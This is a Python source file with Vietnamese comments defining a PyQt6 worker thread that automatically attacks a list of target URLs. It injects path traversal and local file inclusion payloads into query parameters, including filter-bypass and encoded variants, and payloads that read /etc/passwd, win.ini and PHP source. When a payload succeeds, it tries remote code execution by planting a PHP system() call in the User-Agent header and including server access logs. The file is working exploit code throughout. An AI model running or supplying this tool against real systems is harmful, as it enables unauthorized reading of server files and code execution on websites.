import requests
import base64
import re
from urllib.parse import urlparse, parse_qs
from PyQt6.QtCore import QThread, pyqtSignal

class LFIThread(QThread):
    ket_qua_scan = pyqtSignal(str, str, str) 
    log_process = pyqtSignal(str)            
    hoan_thanh = pyqtSignal()

    def __init__(self, list_urls):
        super().__init__()
        self.targets = list_urls
        self.is_running = True
        
        # Thêm Header giả lập trình duyệt thật để vượt qua các bộ lọc User-Agent cơ bản
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'}
        
        # Path traversal payloads
        self.payloads_file = [
            # 1. Payload chuẩn & Payload ma thuật test tay thành công trên Burp Suite
            "../../../../etc/passwd",
            ".../../../../etc/passwd",  # <--- Payload bypass 3 dấu chấm
            
            # 2. Payload Đột biến sâu (Mutation / Bypass Filter)
            "../../../../../../../../etc/passwd",
            "../../../../../../../../windows/win.ini",
            "..././..././..././..././etc/passwd",      
            "....//....//....//....//etc/passwd",      
            "..%2f..%2f..%2f..%2fetc/passwd",          
            "..%252f..%252f..%252f..%252fetc/passwd",  
            
            # 3. Payload đọc mã nguồn (LFD / LFI)
            "/etc/passwd",
            "index.php",
            "./index.php",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        
        # Đường dẫn file log để tấn công RCE
        self.log_paths = [
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "../../../../xampp/apache/logs/access.log",
            "../../../../var/log/apache2/access.log"
        ]
        
        # Signatures (Đã lọc sạch các tag nhiễu như <html>, PNG)
        self.signatures = [
            b"root:x:0:0",        # Đặc trưng của /etc/passwd trên Linux
            b"[extensions]",      # Đặc trưng của win.ini trên Windows
            b"[fonts]",           # Đặc trưng của win.ini trên Windows
            b"<?php",             # Đặc trưng mã nguồn PHP
        ]

        # Đoạn mã PHP để đầu độc Log (Log Poisoning)
        self.rce_code = "<?php HACKED!! echo 'da RCE thanh cong'; system('whoami'); ?>"

    def run(self):
        self.log_process.emit(f"🔥 Bắt đầu tấn công {len(self.targets)} mục tiêu...")
        
        for url in self.targets:
            if not self.is_running: break
            
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = parse_qs(parsed.query)
            
            if not params: continue

            found_lfi_param = None 

            # Tấn công path traversal 
            for param_name in params:
                for payload in self.payloads_file:
                    if not self.is_running: break
                    
                    new_query_parts = []
                    for k, v in params.items():
                        if k == param_name: new_query_parts.append(f"{k}={payload}")
                        else: 
                            for val in v: new_query_parts.append(f"{k}={val}")
                    
                    attack_url = f"{base_url}?{'&'.join(new_query_parts)}"
                    
                    try:
                        # Gửi Request kèm Header và Tăng Timeout lên 10s
                        res = requests.get(attack_url, headers=self.headers, timeout=10)
                        content = res.content

                        self.log_process.emit(f"Check Path Traversal: ...{attack_url[-40:]} | Len: {len(content)}")

                        is_vuln = False
                        
                        # Ép toàn bộ content trả về thành chữ thường (Bypass chữ hoa <?PHP)
                        content_lower = content.lower()
                        
                        # Check Signature
                        for sig in self.signatures:
                            if sig.lower() in content_lower:
                                is_vuln = True
                                break
                        
                        # Check Base64 (Nếu bị ép mã hóa qua Wrapper)
                        if not is_vuln:
                            try:
                                possible_b64s = re.findall(b'[a-zA-Z0-9+/=]{20,}', content)
                                for b64_str in possible_b64s:
                                    decoded = base64.b64decode(b64_str)
                                    decoded_lower = decoded.lower()
                                    if b"<?php" in decoded_lower or b"root:" in decoded_lower:
                                        is_vuln = True
                                        break
                            except: pass

                        if is_vuln:
                            payload_lower = payload.lower()
                            
                            # Phân loại Lỗi: Bao quát tất cả các payload đột biến
                            if ("../" in payload_lower or 
                                ".../" in payload_lower or 
                                "..../" in payload_lower or 
                                "%2f" in payload_lower or
                                "etc/passwd" in payload_lower or 
                                "win.ini" in payload_lower or
                                payload.startswith("/") or
                                payload.startswith("..\\")):
                                vuln_type = "CÓ LỖI (PATH TRAVERSAL)"
                            else:
                                vuln_type = "CÓ LỖI (LOCAL FILE DISCLOSURE)"

                            # Phát tín hiệu lên GUI
                            self.ket_qua_scan.emit(url, payload, vuln_type)
                            self.log_process.emit(f"<b style='color:orange'>[+] Đọc được file: {payload} - Phân loại: {vuln_type}</b>")
                            
                            found_lfi_param = param_name
                            #break 
                            
                    except Exception: pass
                
                if found_lfi_param: break 

            # Kiểm tra RCE nếu có LFI
            if found_lfi_param:
                self.log_process.emit(f"<b style='color:red'>☠️ PHÁT HIỆN LỖI! ĐANG THỬ RCE...</b>")
                
                # Bắt đầu kỹ thuật Log Poisoning
                self.log_process.emit(">> Thử Log Poisoning...")
                try:
                    # Bơm thuốc: Đưa mã độc PHP vào User-Agent để Server ghi vào Access Log
                    headers_poison = {'User-Agent': self.rce_code}
                    requests.get(url, headers=headers_poison, timeout=5)
                    
                    # Kích nổ: Dùng lỗ hổng LFI để include ngược lại file Access Log
                    for log_path in self.log_paths:
                        new_query_parts = []
                        for k, v in params.items():
                            if k == found_lfi_param: new_query_parts.append(f"{k}={log_path}")
                            else: 
                                for val in v: new_query_parts.append(f"{k}={val}")
                        exploit_url = f"{base_url}?{'&'.join(new_query_parts)}"
                        
                        # Truy cập URL kích nổ (nhớ kèm header chuẩn để không sinh thêm log rác)
                        res = requests.get(exploit_url, headers=self.headers, timeout=10)
                        if b"HACKED" in res.content:
                            self.ket_qua_scan.emit(url, "Log Poisoning", "RCE THÀNH CÔNG")
                            self.log_process.emit(f"<h2 style='color:red; background:yellow'>💥 RCE VIA LOG POISONING!</h2>")
                            break
                except: pass

        self.log_process.emit("🏁 Đã hoàn tất tấn công!")
        self.hoan_thanh.emit()